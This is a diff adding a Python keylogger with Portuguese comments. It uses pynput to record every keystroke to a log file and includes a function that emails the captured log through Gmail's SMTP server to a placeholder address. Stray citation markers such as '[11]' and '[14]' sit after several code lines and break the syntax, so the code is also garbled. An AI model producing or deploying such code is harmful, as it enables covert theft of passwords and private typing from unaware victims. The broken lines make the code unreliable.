@@ -1,0 +1,34 @@
+from pynput import keyboard
+import smtplib
+
+# Arquivo para salvar os logs [7]
+log_file = "log.txt"
+
+def on_press(key):
+    try:
+        # Captura teclas alfanuméricas [8]
+        char = key.char
+    except AttributeError:
+        # Captura teclas especiais (Espaço, Enter, etc.) [8]
+        char = f" [{key}] "
+    
+    with open(log_file, "a") as f:
+        f.write(char)
+
+# Função para envio por e-mail (Exemplo simplificado) [9, 10]
+def enviar_email():
+    # Nota: Use "senhas de app" para o login [7, 11]
+    usuario = "seu_email@gmail.com"
+    senha = "sua_senha_de_app" 
+    
+    with smtplib.SMTP("smtp.gmail.com", 587) as servidor:
+        servidor.starttls() # Criptografa a comunicação [12]
+        servidor.login(usuario, senha) [11]
+        with open(log_file, "r") as f:
+            corpo = f.read()
+        servidor.sendmail(usuario, "destino@email.com", corpo) [9]
+
+# Inicia o monitoramento em uma thread dedicada [8, 13]
+with keyboard.Listener(on_press=on_press) as listener:
+    print("Keylogger em execução... Pressione Ctrl+C para parar.")
+    listener.join() [14]
